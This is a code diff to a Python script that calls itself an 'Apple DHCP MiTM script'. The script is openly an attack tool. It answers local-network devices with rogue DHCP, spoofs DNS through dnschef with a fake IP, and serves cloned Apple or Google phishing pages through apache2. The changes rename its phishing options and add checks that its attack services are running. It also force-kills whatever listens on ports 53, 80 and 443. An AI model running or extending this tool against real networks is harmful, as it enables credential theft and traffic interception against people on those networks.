@@ -30,37 +30,33 @@ Base.print_banner()
 # region Parse script arguments
 parser = ArgumentParser(description='Apple DHCP MiTM script')
 parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
-parser.add_argument('-f', '--fishing_domain', type=str, default="auth.apple.wi-fi.com",
+parser.add_argument('-d', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
                     help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
-parser.add_argument('-p', '--fishing_domain_path', type=str, default="apple",
+parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
                     help='Set local path to domain name for social engineering (default="apple")')
-parser.add_argument('-k', '--kill', action='store_true', help='Kill process')
+parser.add_argument('-k', '--kill', action='store_true', help='Kill all subprocesses')
 parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
 parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
 parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
 args = parser.parse_args()
 # endregion
 
-# region Kill subprocess
-sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep | awk '{print $2}') 2>/dev/null"],
-          shell=True)
-sub.Popen(["kill -9 $(ps aux | grep dnschef | grep -v grep | awk '{print $2}') 2>/dev/null"],
-          shell=True)
-
-# Kill the processes that listens on 53 UDP port
-sub.Popen(["kill -9 $(lsof -iUDP -n -P | grep ':53' | awk '{print $2}') 2>/dev/null"],
-          shell=True)
-
-# Kill the processes that listens on 80 TCP port
-sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':80' | awk '{print $2}') 2>/dev/null"],
-          shell=True)
-
-# Kill the processes that listens on 443 TCP port
-sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':443' | awk '{print $2}') 2>/dev/null"],
-          shell=True)
+# region Kill subprocesses
+sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep | awk '{print $2}') 2>/dev/null"], shell=True)
+sub.Popen(["kill -9 $(ps aux | grep dnschef | grep -v grep | awk '{print $2}') 2>/dev/null"], shell=True)
 
 if args.kill:
     exit(0)
+
+# Kill the processes that listens on 53 UDP port
+sub.Popen(["kill -9 $(lsof -iUDP -n -P | grep ':53' | awk '{print $2}') 2>/dev/null"], shell=True)
+
+# Kill the processes that listens on 80 TCP port
+sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':80' | awk '{print $2}') 2>/dev/null"], shell=True)
+
+# Kill the processes that listens on 443 TCP port
+sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':443' | awk '{print $2}') 2>/dev/null"], shell=True)
+
 # endregion
 
 # region Set global variables
@@ -142,26 +138,29 @@ if __name__ == "__main__":
     Base.check_installed_software("ps")
     # endregion
 
-    # Variables
+    # region Variables
     script_dir = project_root_path
     apache2_sites_available_dir = "/etc/apache2/sites-available/"
     apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
     apache2_sites_path = "/var/www/html/"
     redirect_path = apache2_sites_path + "redirect/"
+    # endregion
 
-    se_domain = args.fishing_domain
-    if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
-        se_path = apache2_sites_path + args.fishing_domain_path
+    # region Set phishing domain and path
+    se_domain = args.phishing_domain
+    if args.phishing_domain_path == "google" or args.phishing_domain_path == "apple":
+        se_path = apache2_sites_path + args.phishing_domain_path
     else:
-        se_path = args.fishing_domain_path
+        se_path = args.phishing_domain_path
 
-    Base.print_info("Fishing domain: ", se_domain)
-    Base.print_info("Fishing path: ", se_path)
+    Base.print_info("Phishing domain: ", se_domain)
+    Base.print_info("Phishing domain local path: ", se_path)
+    # endregion
 
     # Directory for fishing site
     if not path.exists(se_path):
-        if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
-            copytree(src=script_dir + "/Fishing_domains/" + args.fishing_domain_path, dst=se_path)
+        if args.phishing_domain_path == "google" or args.phishing_domain_path == "apple":
+            copytree(src=script_dir + "/Phishing_domains/" + args.phishing_domain_path, dst=se_path)
         else:
             Base.print_error("Directory: ", se_path, " does not exist!")
             exit(1)
@@ -238,7 +237,18 @@ if __name__ == "__main__":
             exit(2)
     # endregion
 
+    # region Check apache2 is running
+    sleep(2)
+    apache2_pid = Base.check_process("apache2")
+    if apache2_pid == 0:
+        Base.print_error("Process apache2 is not running!")
+        exit(1)
+    else:
+        Base.print_info("Process apache2 is running, PID: ", str(apache2_pid))
+    # endregion
+
     # region Dnschef settings
+    Base.print_info("Start dnschef ...")
     try:
         sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
                    ' >' + script_dir + '/dnschef.log 2>&1 &'],
@@ -251,6 +261,17 @@ if __name__ == "__main__":
             Base.print_error("Something else went wrong while trying to run ", "`dnschef`")
             exit(2)
     # endregion
+
+    # region Check dnschef is running
+    sleep(2)
+    dnschef_pid = Base.check_process("dnschef")
+    if dnschef_pid == 0:
+        Base.print_error("Process dnschef is not running!")
+        exit(1)
+    else:
+        Base.print_info("Process dnschef is running, PID: ", str(dnschef_pid))
+    # endregion
+
     # endregion
 
     # region Find Apple devices in local network with arp-scan or nmap
